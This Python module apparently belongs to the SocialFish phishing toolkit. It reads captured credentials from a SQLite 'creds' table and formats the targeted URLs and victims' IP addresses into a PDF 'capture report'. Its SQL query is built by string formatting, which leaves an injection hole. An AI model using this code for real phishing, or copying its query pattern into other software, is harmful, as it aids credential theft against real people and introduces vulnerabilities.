import os
import subprocess
from pylatex import Document, PageStyle, Head, Foot, MiniPage, \
    StandAloneGraphic, MultiColumn, Tabu, LongTabu, LargeText, MediumText, \
    LineBreak, NewPage, Tabularx, TextColor, simple_page_number, Command
from pylatex.utils import bold, NoEscape
from sqlite3 import connect
from time import strftime

def generate_report(DATABASE, cpm):
    conex = connect(DATABASE)
    cursor = conex.cursor()
    _cURL = cpm
    choose_url = 'http' if _cURL == 'All' else _cURL
    result_query = cursor.execute('SELECT * FROM creds WHERE url GLOB "*{}*"'.format(choose_url)).fetchall()
    result_count = len(result_query)
    return result_query, result_count

def generate_unique(DATABASE, cpm):
    geometry_options = {
        "head": "60pt",
        "margin": "0.5in",
        "bottom": "0.6in",
        "includeheadfoot": True
    }
    doc = Document(geometry_options=geometry_options)
    first_page = PageStyle("firstpage")
    with first_page.create(Head("L")) as header_left:
        with header_left.create(MiniPage(width=NoEscape(r"0.49\textwidth"), pos='c', align='L')) as logo_wrapper:
            logo_file = os.path.join(os.path.dirname(__file__), 'SOCIALFISH_transparent.png')
            if os.path.exists(logo_file):
                logo_wrapper.append(StandAloneGraphic(image_options="width=120px", filename=logo_file))
    with first_page.create(Head("R")) as header_right:
        with header_right.create(MiniPage(width=NoEscape(r'0.49\textwidth'), pos='c', align='r')) as wrapper_right:
            wrapper_right.append(LargeText(bold('SOCIALFISH')))
            wrapper_right.append(LineBreak())
            wrapper_right.append(MediumText(bold('UNDEADSEC')))
            wrapper_right.append(LineBreak())
            wrapper_right.append(NoEscape(r'\today'))
    with first_page.create(Head('C')) as header_center:
        header_center.append('RAPPORT DE CAPTURE')
    with first_page.create(Foot("C")) as footer:
        pass
    doc.preamble.append(first_page)
    with doc.create(Tabu("X[l] X[r]")) as first_page_table:
        customer = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='h')
        branch = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='t!', align='r')
        first_page_table.add_row([customer, branch])
        first_page_table.add_empty_row()
    doc.change_document_style("firstpage")
    doc.add_color(name="lightgray", model="gray", description="0.80")
    with doc.create(LongTabu("X[15l]", row_height=1.8)) as data_table:
        data_table.add_row(["Organisation\nIP de capture\n"], mapper=bold, color="lightgray")
        data_table.add_empty_row()
        data_table.add_hline()
        result_query, result_count = generate_report(DATABASE, cpm)
        for i in range(result_count):
            row = result_query[i]
            try:
                url_parts = row[1].split('//')
                url = url_parts[1] if len(url_parts) > 1 else row[1]
            except Exception:
                url = str(row[1])
            ip = str(row[7])
            row_tex = [url + '\n' + ip + '\n']
            if (i % 2) == 0:
                data_table.add_row(row_tex, color="lightgray")
            else:
                data_table.add_row(row_tex)
    doc.append(NewPage())
    
    pdf_name = 'Rapport{}'.format(strftime('-%y%m'))
    static_folder = os.path.join(os.getcwd(), 'templates', 'static')
    pdf_path_no_ext = os.path.join(static_folder, pdf_name)

    if not os.path.exists(static_folder):
        os.makedirs(static_folder)

    try:
        doc.generate_pdf(pdf_path_no_ext, clean_tex=False)
    except subprocess.CalledProcessError:
        pass
